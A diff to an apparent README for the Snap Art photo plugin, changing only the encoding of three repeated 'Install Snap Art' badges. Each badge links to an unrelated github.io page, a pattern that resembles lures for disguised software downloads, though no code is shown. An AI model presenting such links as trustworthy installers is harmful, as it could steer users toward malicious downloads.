@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Snap Art](https://img.shields.io/badge/⬇_Install_Snap%20Art-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Snap Art](https://img.shields.io/badge/⬇_Install_Snap+Art-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Snap Art is a creative photo effects plugin and standalone application that tran
 
 <div align="center">
 
-[![⬇ Install Snap Art](https://img.shields.io/badge/⬇_Install_Snap%20Art-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Snap Art](https://img.shields.io/badge/⬇_Install_Snap+Art-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Snap Art is a creative photo effects plugin and standalone application that tran
 
 <div align="center">
 
-[![⬇ Install Snap Art](https://img.shields.io/badge/⬇_Install_Snap%20Art-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Snap Art](https://img.shields.io/badge/⬇_Install_Snap+Art-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
